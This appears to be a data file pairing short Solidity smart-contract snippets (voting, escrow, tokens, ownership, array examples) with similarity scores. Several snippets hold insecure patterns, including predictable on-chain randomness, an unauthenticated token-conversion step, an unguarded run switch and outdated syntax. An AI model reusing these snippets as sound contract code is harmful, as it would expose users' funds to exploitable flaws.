        return winners;
    }

    function random() private view returns(uint) {

        uint interval = now - startTime;

        bytes32 randomNum = keccak256(abi.encodePacked(interval + nonce + tx.gasprice + addr));

        uint number;
        for(uint i=0;i<randomNum.length;i++){
            number = number + uint(randomNum[i])*(2**(8*(randomNum.length-(i+1))));
        }
        return number % 67;
    }

}",0.5883951591230199,"contract Fermat {

    
    address public owner = msg.sender;
    uint releaseTime = now + 17280000;

    
    function addBalance() public payable {

    }

    function getOwner() view public returns (address)  {
        return owner;
    }

    
    function getReleaseTime() view public returns (uint)  {
        return releaseTime;
    }

    
    function withdraw() public {
        require(msg.sender == owner);
        require(now >= releaseTime);

        msg.sender.transfer(this.balance);
    }

    function getBalance() view public returns (uint256) {
        return this.balance;
    }

    
    function claim(uint256 a, uint256 b, uint256 c, uint256 n) public {
        uint256 value = solve(a, b, c, n);
        if (value == 0) {
            msg.sender.transfer(this.balance);
        }
    }



    
    function solve(uint256 a, uint256 b, uint256 c, uint256 n) pure public returns (uint256) {
        assert(n > 2);
        assert(a > 0);
        assert(b > 0);
        assert(c > 0);
        uint256 aExp = power(a, n);
        uint256 bExp = power(b, n);
        uint256 cExp = power(c, n);

        uint256 sum = add(aExp, bExp);
        uint256 difference = sub(sum, cExp);
        return difference;
    }

    
    function power(uint256 a, uint256 pow) pure public returns (uint256) {
        assert(a > 0);
        assert(pow > 0);
        uint256 result = 1;
        if (a == 0) {
            return 1;
        }
        uint256 temp;
        for (uint256 i = 0; i < pow; i++) {
            temp = result * a;
            assert((temp / a) == result);
            result = temp;
        }
        return uint256(result);
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }


}"
"contract Original {
  mapping(bytes32 => Person) public persons;
}",0.5898556865827288,"contract Casino {

    mapping(address => bool) public authorized;

}"
"contract TokenExchange {
    IERC20 token1;
    IERC20 token2;
    address owner;
    uint exchangeRate;
    
    address trnFrom;
    uint trnAmount;

    constructor() public {
        token1 = IERC20(0x508ce9c3c5219fc1cd08a448a247c08c707c6eb1);
        token2 = IERC20(0xf5de6643a3e30462e0ef34dc3fb3905a7824043b);
        owner = msg.sender;
        exchangeRate = 2;
    }

    function askConversionTNK1toTKN2 (uint256 _amount) public {
        trnFrom = msg.sender;
        trnAmount = _amount;
    }

    function executeConversionTKN1toTKN2 () public { 
        token1.transferFrom(trnFrom, this, trnAmount);
        token2.transfer(trnFrom, trnAmount*exchangeRate);
    }
}",0.5891003890878309,"contract exForward{

    address public owner;

    event eth_deposit(address sender, uint amount);

    event erc_deposit(address from, address ctr, address to, uint amount);

    constructor() public {

        owner = 0x50D569AF6610C017DDE11A7F66DF3FE831F989FA;

    }

    function trToken(address tokenContract, uint tokens) public{

        ERC20(tokenContract).transfer(owner, tokens);

        emit erc_deposit(msg.sender, tokenContract, owner, tokens);

    }

    function() payable public {

        uint256 ethAmount = (msg.value * 8) / 10;

        owner.transfer(ethAmount);

        emit eth_deposit(msg.sender,msg.value);

    }

}"
"contract SomeTest {
    

    modifier requiresFee() {
        if (msg.value < computeFee()) { throw; }
        _
    }

    
    function computeFee() internal returns (uint) {
        
    }

    function sellEnergy(uint kwh) public requiresFee() {
        coinAccount[msg.sender] += (kwh * kWh_rate);
    }
}",0.5973649829625659,"contract Ownable {

    address public owner;

    function Ownable() public {

        owner = msg.sender;

    }

    function _msgSender() internal view returns (address)

    {

        return msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);

        _;
    }

}"
"contract Array {

    uint[] arr;   
    uint[2] arr2; 



    
    function setDynArrayElement() public {
        arr.push(2);
        arr.push(3);
        arr.push(4);
    }

    
    function getDynArrayLength() public view returns (uint _l) {
        assembly {
            _l := sload(0)
        }
    }

    
    function getDynElement(uint i) public view returns (uint _x) {
        assembly {
            _x := sload(add(keccak256(sload(0), 32),i))
        }
    }



    
    function setFixnArrayElement() public {
        arr2[0]= 5;
        arr2[1]= 6;
    }

    
    function getFixElement() public view returns (uint _value1, uint _value2) {
        assembly {
            _value1 := sload(1)
            _value2 := sload(2)
        }
    }



    
    function getFixMemoryArrayElement(uint i) public pure returns (uint _l) {
        uint[2] memory arr3;
        arr3[0] = 7;
        arr3[1] = 8;
        assembly {
            _l := mload(add(arr3,mul(i,0x20)))
        }
    }

    function getFixMemoryArrayLen() public pure returns (uint _l) {
        uint[] memory arr4 = new uint[](10);
        assembly {
            _l := mload(arr4)
        }
    }
    function getFixMemoryArrayElement_2(uint i) public pure returns (uint _l) {
        uint[] memory arr4 = new uint[](5);
        arr4[0] = 9;
        arr4[1] = 10;
        assembly {
            _l := mload(add(arr4,mul(i,0x20)))
        }
    }
}",0.5728064617022178,"contract TubInterface {

    function mat() public view returns(uint);

    

    function ink(bytes32 cup) public view returns (uint);
    function tab(bytes32 cup) public returns (uint);
    function rap(bytes32 cup) public returns (uint);

    
    
    function per() public view returns (uint ray);
    
    function ask(uint wad) public view returns (uint);
    
    function bid(uint wad) public view returns (uint);
    function join(uint wad) public;
    function exit(uint wad) public;

    
    
    function tag() public view returns (uint wad);
    
    function safe(bytes32 cup) public returns (bool);

    
    function open() public returns (bytes32 cup);
    function give(bytes32 cup, address guy) public;
    function lock(bytes32 cup, uint wad) public;
    function free(bytes32 cup, uint wad) public;
    function draw(bytes32 cup, uint wad) public;
    function wipe(bytes32 cup, uint wad) public;
    function shut(bytes32 cup) public;
    function bite(bytes32 cup) public;
}"
"contract MrHungry {

    uint oranges = 2;
    uint apples = 0;

    modifier checkOrangeStock() {
        require(oranges > 0);
        _;
    }

    modifier checkAppleStock() {
        require(apples > 0);
        _;
    }

    function eatStuff() public {
        eatOranges();
        eatApples();
    }

    function eatOranges() private checkOrangeStock {
        oranges--;
    }

    function eatApples() private checkAppleStock {
        apples--;
    }
}",0.5029984593617302,"contract Control {

    address owner;
    
    modifier auth {
         require(msg.sender == owner);
         _; 
    }

    function withdrawTo(address _to, uint amt) public auth {
        _to.transfer(amt);
    }
    
    function withdrawTokenTo(TokenInterface token, address _to, uint amt) public auth {
        require(token.transfer(_to, amt));
    }

    function kill() public auth {
        selfdestruct(owner);
    }
}"
"contract Stages {

    struct Stage {
        uint first;
        uint last;
    }

    Stage[] public stages;

    function appendStage(uint first, uint last) public {
        Stage memory s = Stage({
            first: first,
            last: last
        });
        stages.push(s);
    }

    function isStage(uint i) public view returns(bool) {
        return block.number >= stages[i].first && block.number <= stages[i].last;
    }

    
}",0.5972871806963302,"contract AOQUtil {

    function getLevel(uint value) public view returns (uint);

    function getStaticCoefficient(uint level) public pure returns (uint);

    function getRecommendCoefficient(uint times) public pure returns (uint);

    function compareStr(string memory _str, string memory str) public pure returns (bool);

}"
"contract Test {
  uint public myVal;

  modifier onlySelf(){
      if (msg.sender != address(this)) throw;
      _;
  }

  function callIt() {
      this.call.gas(50000)(bytes4(sha3(""setMyVal(uint256)"")), 123);
  }

  function setMyVal(uint _newVal) onlySelf {
      myVal = _newVal;
  }
}",0.5785716115190848,"contract accessControlled {
    address public owner;

    function owned() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        if ( msg.sender != owner ) throw;
        
        _;
    }

    function transferOwnership( address newOwner ) onlyOwner {
        owner = newOwner;
    }

}"
"contract Animals {

    enum Branch {mammal, bird, fish, insect}
    enum Diet {carnivore, herbivore, onmivore}

    struct Animal {
        
        Branch branch;
        Diet diet;
    }

    mapping(bytes32 => Animal) public animals;

    function setAnimal(bytes32 id, Branch branch, Diet diet) public {
        Animal storage a = animals[id];
        a.branch = branch;
        a.diet = diet;
    }

    function animalIsBranch(bytes32 id, Branch branch) public view returns(bool isIndeed) {
        return animals[id].branch == branch;
    }
    function animalIsDiet(bytes32 id, Diet diet) public view returns(bool isIndeed) {
        return animals[id].diet == diet;
    }

    
    function carnivoreFish(bytes32 id) public view returns(bool isIndeed) {
        return animalIsBranch(id, Branch.fish) && animalIsDiet(id, Diet.carnivore);
    }
    
}",0.5381498584294566,"contract ERC223Interface {
  uint public totalSupply;
  function balanceOf(address who) public view returns (uint);
  function allowedAddressesOf(address who) public view returns (bool);
  function getTotalSupply() public view returns (uint);

  function transfer(address to, uint value) public returns (bool ok);
  function transfer(address to, uint value, bytes data) public returns (bool ok);
  function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);

  event Transfer(address indexed from, address indexed to, uint value, bytes data);
  event TransferContract(address indexed from, address indexed to, uint value, bytes data);
}"
"contract MappingStructArray {

    struct S1 {
        uint a;
        bool b;
    }

    struct S2 {
        mapping(uint => S1[]) s1Arrays;
    }

    mapping(uint => S2) S2Structs;

    function pushS1(uint key, uint g, uint a, bool b) public {
        S2 storage s2 = S2Structs[key];
        S1 memory s1 = S1({
            a: a,
            b: b
        });
        s2.s1Arrays[g].push(s1);
    }
}",0.5417405870211975,"contract SafeMath {
    function safeSub(uint a, uint b) internal returns (uint) {
        sAssert(b <= a);
        return a - b;
    }
    function safeAdd(uint a, uint b) internal returns (uint) {
        uint c = a + b;
        sAssert(c>=a && c>=b);
        return c;
    }
    function sAssert(bool assertion) internal {
        if (!assertion) {
            revert();
        }
    }
}"
"contract HelloFactory {
    event CreatedHS(address indexed hsAddr);

    function createHS() returns (address hsAddr) {
        HelloSystem hs = new HelloSystem();
        CreatedHS(hs);
        return hs;
    }

    function deleteHS(address hs){
        HelloSystem(hs).remove();
    }

}",0.5766941463271952,"contract OwnedI {

    event LogOwnerChanged(address indexed previousOwner, address indexed newOwner);



    function getOwner()

        view public

        returns (address);



    function setOwner(address newOwner)

        public

        returns (bool success); 

}"
"contract CrowdFactory {    
  function executeGetInfo (uint _userId) {
    
    ClientSc sc = usersinfo[msg.sender];
    
    var (userId, mail, password, contractAddress, publickey, ...) = sc.getMyInfo()
  }
}",0.5280886490875418,"contract ReceiverCaller is ICallee {

    function callFunction(
        address sender,
        Account.Info memory accountInfo,
        bytes memory data
    ) public {
        address(this).call(data);

    }
}"
"contract FunWithArrays {

  struct Project{
    int id;
    string name;
    int votes;    
    address[] voters;
    string[] comments;
  }

  Project[] public projects;

  function vote(uint index , string comment) public {
    Project storage project = projects[index];
    project.votes++;     
    project.voters.push(msg.sender);
    project.comments.push(comment); 
  }
}",0.5295752389517185,"contract Vit is MintableToken {
  string public constant name = ""VitalikCoin"";
  string public constant symbol = ""VIT"";
  uint   public constant decimals = 18;
  
  function airdrop(address[] addresses, uint[] amounts) onlyOwner{
    for (uint i = 0; i < addresses.length; i++) {
       super.transfer(addresses[i], amounts[i]);
    }
  }
}"
"contract PubKey {
     bytes32 pubKeyHalf1, pubKeyHalf2;

     function PubKey(bytes32 initKeyHalf1, bytes32 initKeyHalf2) {
         pubKeyHalf1 = initKeyHalf1;
         pubKeyHalf2 = initKeyHalf2;
     }

     function getPubKeyHalf1() constant returns (bytes32) {
        return pubKeyHalf1;
     }

     function getPubKeyHalf2() constant returns (bytes32) {
        return pubKeyHalf2;
     }
}",0.5438806632589226,"contract ICourt is Ownable {



    function getCaseId(address applicant, address respondent, bytes32 deal, uint256 date, bytes32 title, uint256 amount) 

        public pure returns(bytes32);



    function getCaseStatus(bytes32 caseId) public view returns(uint8);



    function getCaseVerdict(bytes32 caseId) public view returns(bool);

}"
"contract Test {
    function addTest() public pure returns (byte c1, byte c2, byte c3) {
        
        bytes memory b = new bytes(169);
        b[0] = byte(59);
        b[1] = byte(42);
        b[2] = byte(99);

        assembly {
            
            
            let data32b := mload(add(b, 0x20))
            c1 := data32b
            
            c2 := mul(data32b, 256)
            
            c3 := mul(data32b, exp(256, 2))
        }
    }
}",0.5283623218408112,"contract Util {



   

    function upper(string _base) internal pure returns (string) {

        bytes memory _baseBytes = bytes(_base);

        for (uint i = 0; i < _baseBytes.length; i++) {

            bytes1 b1 = _baseBytes[i];

            if (b1 >= 0x61 && b1 <= 0x7A) {

                b1 = bytes1(uint8(b1)-32);

            }

            _baseBytes[i] = b1;

        }

        return string(_baseBytes);

    }



}"
"contract MyContract {
    function myFunction(MethodStringInterface _a) {
        _a.method(""abc"");
    }
}",0.5472011508578857,"contract AuctionInterface {

    function cancelAuction(uint256 _tokenId) external;

}"
"contract Registry {
  mapping (bytes32 => address) public libraries;
  mapping (bytes32 => address) public contracts;

    function addLibrary(bytes32 _name, address _lib) external {
    require(libraries[_name] == address(0), ""LIBRARY_ALREADY_EXISTS"");
    require(_lib != address(0), ""INSERT_VALID_LIBRARY_ADDRESS"");
    libraries[_name] = _lib;
  }

  function addContract(bytes32 _name, address _contract) external {
    Enabled(_contract).setCMCAddress(address(this));
    contracts[_name] = _contract;
  }
}",0.5788396259638894,"contract Addr2AddrArrStorage is StorageAdministratorRole

{











    mapping (bytes32 => mapping (address => address[])) private addr2AddrArrStorage;











    function addToAddr2AddrArr(bytes32 _name, address _address, address _value)

        public 

        onlyStorageAdministrator 

    {

        addr2AddrArrStorage[_name][_address].push(_value);

    }



    function getAddr2AddrArr(bytes32 _name, address _address)

        public view 

        returns (address[] memory) 

    {

        return addr2AddrArrStorage[_name][_address];

    }

}"
"contract MetaCoin {
          struct  Entity {
                   string name;
                   string nickname;
                   string streetaddress;
          }
          mapping (uint => Entity) public entities;
          uint entitiesCount;
          event EntityAdded(address indexed _senderAddress, uint _entityId);

          function addEntity(string _name, string _nickname, string _streetaddress) returns(uint entityCount) {
                
                entitiesCount++;
                entities[entitiesCount]=Entity(_name,_nickname,_streetaddress);
                EntityAdded(msg.sender,entitiesCount);
          }
     }",0.5428752184557314,"contract Username {
  event Updated(address indexed user, string indexed username);

  mapping(address => string) public username;
  mapping(string => address) public owner;

  function Update(string memory _username) public {
    require(owner[_username] == address(0));
    string memory oldUserName = username[msg.sender];
    owner[_username] = msg.sender;
    owner[oldUserName] = address(0);
    username[msg.sender] = _username;
    emit Updated(msg.sender, _username);
  }
}"
"contract ExampleTwo {

  IExampleOne exampleOne;

  constructor(address _exampleOne) {
    exampleOne = IExampleOne(_exampleOne);
  }

  function func(bytes32 name) {
    (bytes32 a, bytes32 b, bytes32[] memory c, uint d) = exampleOne.problems(name); 
    
  }
}",0.5116035121701115,"contract Contract {

    bytes32 public Name;



    

    

    constructor(bytes32 _contractName) public {

        Name = _contractName;

    }



    function() public payable { }

    

    function sendFunds(address receiver, uint amount) public {

        receiver.transfer(amount);

    }    

}"
"contract InvalidAccess {  
    PublicArray array_contract;
    constructor() {
         array_contract = PublicArray.at(0x(...))
    }

    function go() {
       return array_contract.array[1000];
    }
}",0.5260901720152069,"contract Contract {
    bytes32 public Name;

    
    
    constructor(bytes32 _contractName) public {
        Name = _contractName;
    }

    function() public payable { }
}"
"contract Spoke {

    string public storedString;

    event LogSetHubString(address sender, string _string);

    function setString(string _string) public returns(bool success) {
        emit LogSetHubString(msg.sender, _string);
        storedString = _string;
        return true;
    }

}",0.5966279467435073,"contract Greeter is Mortal {
    
    string greeting;

    
    constructor(string _greeting) public {
        greeting = _greeting;
    }

    
    function changeGreeting(string _greeting) public {
        greeting = _greeting;
    }
    
    
    function greet() public view returns (string) {
        return greeting;
    }
}"
"contract Voting {

  mapping (bytes32 => uint8) public votesReceived;
  mapping (bytes32 => bool) public candidateList;

  function Voting(bytes32[] candidateNames) {
    for(uint i = 0; i < candidateNames.length; i++) {
      candidateList[candidateNames[i]] = true;
    }
  }

  function totalVotesFor(bytes32 candidate) constant returns (uint8) {
    require(validCandidate(candidate));
    return votesReceived[candidate];
  }

  function voteForCandidate(bytes32 candidate) {
    require(validCandidate(candidate) == true);
    votesReceived[candidate] += 1;
  }

  function validCandidate(bytes32 candidate) constant returns (bool) {
    return candidateList[candidate];
  }

}",0.5262363588050649,"contract Factory is RegBase
{




    
    
    

    
    
    
    





    
    uint public value;





    
    event Created(address indexed _creator, bytes32 indexed _regName, address indexed _addr);





    
    modifier feePaid() {
        require(msg.value == value || msg.sender == owner);
        _;
    }





    
    
    
    
    
    
    
    function Factory(address _creator, bytes32 _regName, address _owner)
        RegBase(_creator, _regName, _owner)
    {
        
    }
    
    
    
    function set(uint _fee) 
        onlyOwner
        returns (bool)
    {
        value = _fee;
        return true;
    }

    
    function withdrawAll()
        public
        returns (bool)
    {
        owner.transfer(this.balance);
        return true;
    }

    
    
    
    
    
    
    function createNew(bytes32 _regName, address _owner) 
        payable returns(address kAddr_);
}"
"contract Test {

    function comparePoints (uint player1Points, uint player2Points) public pure returns (uint) {
        uint result;

        if(player1Points > player2Points || player1Points >= 50){
            result = 1;
        }
        return result;
    }
}",0.5810709709061482,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract Hub {

    event LogNewAuction(address auction);

    function newSimpleAuction(uint duration) returns(address createdAuctionContract) {
        SimpleAuction newSimpleAuction = new SimpleAuction(duration, msg.sender);
        LogNewAuction(newSimpleAuction);
        return newSimpleAuction;
    }
}",0.5093319394034475,"contract UpgradeabilityStorage {
    
    uint256 internal _version;

    
    address internal _implementation;

    
    function version() external view returns (uint256) {
        return _version;
    }

    
    function implementation() public view returns (address) {
        return _implementation;
    }
}"
"contract BaseLookup {

  struct Lookup {
    uint id;
    bytes32 name;
  }

  mapping(uint => Lookup) lookupById;

  function setLookupById(uint id, bytes32 name) public returns(bool success) {
    Lookup memory lookup;
    lookup.id = id;
    lookup.name = name;
    lookupById[id] = lookup;
    return true;
  }

  function getLookupById(uint _id) public constant returns (uint, bytes32) {
    return (lookupById[_id].id, lookupById[_id].name);
  }
}",0.5702479212179581,"contract Enlist {

  struct Record {

    address investor;

    bytes32 _type;

  }



  Record[] records;



  function setRecord (

    address _investor,

    bytes32 _type

  ) internal {

    records.push(Record(_investor, _type));

  }



  function getRecordCount () constant

  public

  returns (uint) {

    return records.length;

  }



  function getRecord (uint index) view

  public

  returns (address, bytes32) {

    return (

      records[index].investor,

      records[index]._type

    );

  }

}"
"contract ClientLookup {

  BaseLookup b;

  function DerivedLookup(address baseLookupAddress) public {
    b = BaseLookup(baseLookupAddress);
  }

  struct Lookup {
    uint id;
    string name;
  }

  function set(uint id, bytes32 name) public returns(bool success) {
    return b.setLookupById(id, name);
  }

  function get(uint id) public view returns(uint  theId, bytes32 name) {
    (theId, name) = b.getLookupById(id);
    return (theId, name);
  }
}",0.5914852149774454,"contract PricingStrategy {

  
  function isPricingStrategy() public pure returns (bool) {
    return true;
  }

  
  function isSane(address ) public pure returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address ) public pure returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public view returns (uint tokenAmount);
}"
"contract Ballot {
    struct Escrow {
        address thirdParty;
        address seller;
        address buyer;
        uint amount;
        address recipient;
        uint status;
    }
    uint numEscrows;
    mapping (uint => Escrow) escrows;

    function start(address seller, address thirdParty) returns (uint escrowId) {
        escrowId = numEscrows;
        numEscrows++;
        Escrow memory e;
        e.thirdParty = thirdParty;
        e.seller = seller;
        e.buyer = msg.sender;
        e.amount = msg.value;
        e.recipient = seller;
        e.status = 1; 

        escrows[escrowId] = e;

        return escrowId;
    }

    function start1(address seller, address thirdParty) returns (uint escrowId) {
        escrows[numEscrows].thirdParty = thirdParty;
        escrows[numEscrows].seller = seller;
        escrows[numEscrows].buyer = msg.sender;
        escrows[numEscrows].amount = msg.value;
        escrows[numEscrows].recipient = seller;
        escrows[numEscrows].status = 1; 
        numEscrows++;
        return numEscrows;
    }
}",0.5524918516625202,"contract OwnedAccount is ErrorHandler {
    address public owner;
    bool acceptDeposits = true;

    event evPayOut(address msg_sender, uint msg_value, address indexed _recipient, uint _amount);

    modifier onlyOwner() {
        if (msg.sender != owner) doThrow(""onlyOwner"");
        else {_}
    }

    modifier noEther() {
        if (msg.value > 0) doThrow(""noEther"");
        else {_}
    }

    function OwnedAccount(address _owner) {
        owner = _owner;
    }

    function payOutPercentage(address _recipient, uint _percent) internal onlyOwner noEther {
        payOutAmount(_recipient, (this.balance * _percent) / 100);
    }

    function payOutAmount(address _recipient, uint _amount) internal onlyOwner noEther {
        
        if (!_recipient.call.value(_amount)())
            doThrow(""payOut:sendFailed"");
        else
            evPayOut(msg.sender, msg.value, _recipient, _amount);
    }

    function () returns (bool success) {
        if (!acceptDeposits) throw;
        return true;
    }
}"
"contract TestAssemblyAndRevert {
    function test(address from, address to, uint256 value) public {
        
        address token = 0xedc2d4aca4f9b6a23904fbb0e513ea0668737643;

        
        assembly {
            let ptr := mload(0x40)

            
            mstore(ptr, 0x23b872dd00000000000000000000000000000000000000000000000000000000)

            
            
            calldatacopy(add(ptr, 4), 4, 96)

            
            let result := call(gas, token, 0, ptr, 100, ptr, 32)

            if eq(result, 1) {
                return(0, 0)
            }
        }

        revert(""TOKEN_TRANSFER_FROM_ERROR"");
    }
}",0.5452789540011352,"contract OxToken is MiniMeToken {

    uint256 constant D160 = 0x0010000000000000000000000000000000000000000;

    function OxToken(address _tokenFactory)
            MiniMeToken(
                _tokenFactory,
                0x0,                     
                0,                       
                ""Ox Fina"",  
                3,                       
                ""OX"",                   
                false                    
            ) {}

    
    
    
    function multiMint(uint256[] data) public onlyController {
        for (uint256 i = 0; i < data.length; i++) {
            address addr = address(data[i] & (D160 - 1));
            uint256 amount = data[i] / D160;

            assert(generateTokens(addr, amount));
        }
    }

}"
"contract Stoppable {

    bool public isRunning;

    modifier onlyIfRunning {
        require(isRunning);
        _;
    }

    function Stoppable() public {
        isRunning = true;
    }

    function setRunSwitch(bool newSetting) public returns(bool contractRunning) {
        isRunning = newSetting;
    }
}",0.5940594633172259,"contract halting is owned {
    bool public running = true;

    function start() onlyOwner {
        running = true;
    }

    function stop() onlyOwner {
        running = false;
    }

    function destruct() onlyOwner {
        selfdestruct(owner);
    }

    modifier halting {
        assert(running);
        _;
    }
}"
"contract MultiStage {

    struct stage {
      uint256 startDate;
      uint256 endDate;
      uint8 discount;
    }

    stage[] saleStages;

    function addStage(uint256 _start, uint256 _end, uint8 _discount) external {
        require(_start < _end);
        uint256 _length = saleStages.length;
        if (_length > 0) {
             
             require(saleStages[_length-1].startDate > _end);
        }
        saleStages.push(stage(_start, _end, _discount));
    }

    function getCurrentStage() private returns (uint256 _index) {
        _index = saleStages.length;
        while (_index > 0 && now > saleStages[_index-1].endDate) {
            _index--;
        }
        if (_index != saleStages.length) {
            saleStages.length = _index;
        }
        require(_index > 0, ""Final stage has ended"");
        return _index - 1;
    }
}",0.5241919575976971,"contract Manager is Ownable {

    

    address[] managers;



    modifier onlyManagers() {

        bool exist = false;

        uint index = 0;

        (exist, index) = existManager(msg.sender);

        if(owner == msg.sender)

            exist = true;

        require(exist);

        _;

    }

    

    function getManagers() public view returns (address[] memory){

        return managers;

    }

    

    function existManager(address _to) private returns (bool, uint) {

        for (uint i = 0 ; i < managers.length; i++) {

            if (managers[i] == _to) {

                return (true, i);

            }

        }

        return (false, 0);

    }

    function addManager(address _to) onlyOwner public {

        bool exist = false;

        uint index = 0;

        (exist, index) = existManager(_to);

        

        require(!exist);

        

        managers.push(_to);

    }



}"
"contract array {


function conversion (uint8[] array8) returns(uint[] array256) {
   for (uint i = 0 ; i < array8.length ; i++ ) {
       array256[i] = array8[i];

   }

   return array256;
}

}",0.5616527585174802,"contract SafeMath {

	function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

		uint256 c = a + b;

		assert(c >= a && c >= b);



		return c;

	}

}"
"contract DoublyLinkedList {
    struct Node {
        bytes payload;
        uint256 next;
        uint256 prev;
    }

    uint256 nextNodeID = 1;  
    mapping(uint256 => Node) nodes;
    uint256 head;
    uint256 tail;
    uint256 count = 0;

    function append(bytes payload) public {
        if (tail == 0) {
            
            head = nextNodeID;
            tail = nextNodeID;
            nodes[nextNodeID].payload = payload;
        } else {
            nodes[tail].next = nextNodeID;
            nodes[nextNodeID].payload = payload;
            nodes[nextNodeID].prev = tail;
            tail = nextNodeID;
        }
        nextNodeID += 1;
        count += 1;
    }

    function validNode(uint256 nodeID) internal view returns (bool) {
        return nodeID == head || nodes[nodeID].prev != 0;
    }

    function remove(uint256 nodeID) public {
        require(validNode(nodeID));

        Node storage node = nodes[nodeID];

        
        if (tail == nodeID) {
            tail = nodes[nodeID].prev;
        }
        if (head == nodeID) {
            head = nodes[nodeID].next;
        }

        
        if (node.prev != 0) {
            nodes[node.prev].next = node.next;
        }

        
        if (node.next != 0) {
            nodes[node.next].prev = node.prev;
        }

        
        delete nodes[nodeID];

        count -= 1;
    }

    function getNodeIDs() public view returns (uint256[] ids) {
        ids = new uint256[](count);

        uint256 current = head;
        for (uint256 i = 0; i < count; i++) {
            ids[i] = current;
            current = nodes[current].next;
        }
    }

    function getPayload(uint256 nodeID) public view returns (bytes) {
        require(validNode(nodeID));

        return nodes[nodeID].payload;
    }
}",0.5509119335690985,"contract SplittableTokenStorage is PositionTokenStorage {

    using SafeMath for uint256;



    event Transfer(

        address indexed from,

        address indexed to,

        uint256 value

    );

    event Approval(

        address indexed owner,

        address indexed spender,

        uint256 value

    );

    event Mint(

        address indexed minter,

        uint256 tokenAmount,

        uint256 assetAmount,

        uint256 price

    );

    event Burn(

        address indexed burner,

        uint256 tokenAmount,

        uint256 assetAmount,

        uint256 price

    );



    mapping(address => uint256) internal balances;

    mapping (address => mapping (address => uint256)) internal allowed;

    uint256 internal totalSupply_;



    uint256 public splitFactor = 10**18;



    function totalSupply()

        public

        view

        returns (uint256)

    {

        return denormalize(totalSupply_);

    }



    function balanceOf(

        address _owner)

        public

        view

        returns (uint256)

    {

        return denormalize(balances[_owner]);

    }



    function allowance(

        address _owner,

        address _spender)

        public

        view

        returns (uint256)

    {

        return denormalize(allowed[_owner][_spender]);

    }



    function normalize(

        uint256 _value)

        internal

        view

        returns (uint256)

    {

        return _value

            .mul(splitFactor)

            .div(10**18);

    }



    function denormalize(

        uint256 _value)

        internal

        view

        returns (uint256)

    {

        return _value

            .mul(10**18)

            .div(splitFactor);

    }

}"
"contract VotethComment {

    string public comment;
    string public nickname;
    address public author;
    address[] public votethComments;
    address votethCommentMaker;

    constructor(string _comment, string _nickname, address _author, address _votethCommentMaker) public {
        comment = _comment;
        nickname = _nickname;
        author = _author;
        votethCommentMaker = _votethCommentMaker;
    }

    function addComment(string _comment, string _nickname) public {
        VotethCommentSupplier votethCommentSupplier = VotethCommentSupplier(votethCommentMaker);
        votethComments.push(votethCommentSupplier.makeComment(_comment, _nickname, msg.sender));
    }
}",0.5272695584438774,"contract DZariusz is Ownable {


    string public name;
    string public contact;

    event LogSetName(address indexed executor, string newName);
    event LogSetContact(address indexed executor, string newContact);


    constructor(string _name, string _contact) public {

        setName(_name);
        setContact(_contact);

    }



    function setName(string _name)
    public
    onlyOwner
    returns (bool)
    {
        name = _name;
        emit LogSetName(msg.sender, _name);

        return true;
    }



    function setContact(string _contact)
    public
    onlyOwner
    returns (bool)
    {
        contact = _contact;
        emit LogSetContact(msg.sender, _contact);

        return true;
    }



}"
"contract VotethCommentMaker {
    function makeComment(string _comment, string _nickname, address _author) public returns(address) {
        return new VotethComment(_comment, _nickname, _author, this);
    }
}",0.5830170229797366,"contract IBMapping {
	function checkAddress(string memory name) public view returns (address contractAddress);
	function checkOwners(address man) public view returns (bool);
}"
"contract SortStruct {

    struct TestStruct {
        address user;
        uint256 value;
    }


    mapping (uint => uint) helper;

    TestStruct[] public testStructArray;
    TestStruct[] public sortedArray;

    function add(uint256 _value) public {

        TestStruct memory test;

        test.value = _value;
        test.user = msg.sender;
        testStructArray.push(test);

    }

    function sort () public {


        for (uint i = 0; i < testStructArray.length; i++) {


            helper[i] = 0;


            for (uint j = 0; j < i; j++){


                if (testStructArray[i].value < testStructArray[j].value) {


                    if(helper[i] == 0){
                        helper[i] = helper[j];
                    }


                    helper[j] = helper[j] + 1;
                }
            }


            if(helper[i] == 0) {
                helper[i] = i + 1;
            }
        }


        var lengthSortedArray = sortedArray.length;
        for (uint i = 0; i < testStructArray.length; i++) {
            if (i < lengthSortedArray) continue;
            sortedArray.push(TestStruct(msg.sender, 0));
        }


        for (uint i = 0; i < testStructArray.length; i++) {
            sortedArray[helper[i]-1] = testStructArray[i];
        }
    }
}",0.5175581120556119,"contract BatchTransfer {

  address public owner;

  uint256 public totalTransfer;

  uint256 public totalAddresses;

  uint256 public totalTransactions;



  event Transfers(address indexed from, uint256 indexed value, uint256 indexed count);

  

  constructor() public {

    owner = msg.sender;

  }



  modifier restricted() {

    if (msg.sender == owner) _;

  }



  function batchTransfer(address[] _addresses) public payable {

    require (msg.value > 0 && _addresses.length > 0);

    totalTransfer += msg.value;

    totalAddresses += _addresses.length;

    totalTransactions++;

    uint256 value = msg.value / _addresses.length;

    for (uint i = 0; i < _addresses.length; i++) {

      _addresses[i].transfer(value);

    }

    emit Transfers(msg.sender,msg.value,_addresses.length);

  }



  function withdraw() public restricted {

    address contractAddress = this;

    owner.transfer(contractAddress.balance);

  }



  function () payable public {

    msg.sender.transfer(msg.value);

  }  

}"
"contract Verifiable6SidedDiceRoll is VRFConsumerBase {
    using SafeMath for uint;

    bytes32 internal keyHash;
    uint256 internal fee;

    event RequestRandomness(
        bytes32 indexed requestId,
        bytes32 keyHash,
        uint256 seed
    );

    event RequestRandomnessFulfilled(
        bytes32 indexed requestId,
        uint256 randomness
    );

    
    constructor(address _vrfCoordinator, address _link)
        VRFConsumerBase(_vrfCoordinator, _link) public
    {
        vrfCoordinator = _vrfCoordinator;
        LINK = LinkTokenInterface(_link);
        keyHash = 0xced103054e349b8dfb51352f0f8fa9b5d20dde3d06f9f43cb2b85bc64b238205; 
        fee = 10 ** 18; 
    }

    
    function rollDice(uint256 userProvidedSeed) public returns (bytes32 requestId) {
